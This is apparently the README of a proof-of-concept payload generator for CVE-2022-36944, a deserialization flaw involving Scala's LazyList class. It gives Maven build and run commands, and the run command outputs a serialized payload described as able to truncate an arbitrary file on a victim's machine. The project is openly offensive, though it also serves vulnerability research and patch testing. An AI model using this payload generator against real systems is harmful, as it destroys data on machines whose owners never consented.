# CVE-2022-36944 payload generator
This mini-project is created to demonstrate proof of concept of https://nvd.nist.gov/vuln/detail/CVE-2022-36944
vulnerability. It is similar to https://github.com/frohoff/ysoserial/, but generates payload only for this CVE with 
LazyList class.

## Build
```agsl
mvn clean package
```

## Run
The following command will dump the payload in stdout which can be used to truncate arbitrary file
on victim's machine:
```agsl
mvn -q exec:java -Dexec.mainClass="poc.cve.lazylist.payload.Main" -Dexec.args="/file/to/truncate false"
```
